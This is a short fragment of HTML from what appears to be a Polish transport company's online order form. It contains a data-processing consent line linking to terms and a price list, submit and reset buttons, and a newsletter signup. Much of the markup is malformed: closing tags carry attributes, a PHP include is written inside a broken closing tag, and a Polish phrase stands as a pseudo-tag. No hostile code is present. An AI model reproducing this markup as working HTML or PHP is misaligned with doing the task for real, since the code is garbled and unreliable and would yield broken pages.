          <td colspan="3" align="center"> Wyrażam zgodę na przetwarzanie moich danych przez firmę A.K.TRANS s.c. oraz akceptuję <a href="pliki/regulamin2015.pdf">regulamin </a>i <a href="cennik.php">cennik  </a>&nbsp;&nbsp;&nbsp;
		  <br><input type="submit" name="Submit" value="Wyślij zamówienie" onclick='return validation()'>

</przejdź do płatności on-line > </?php include('ArtiTransfer/artitransfer.php'); ?>



<input type="reset" value="Wyczyść formularz">
 


</form method="get" action="ccmail/index.php"></b></input type="submit" value="Zapisz się do newsletter-a"></form method>
<br><br>



</td>
   </tr>
   <br>   </table>
	  

</body>
</html>
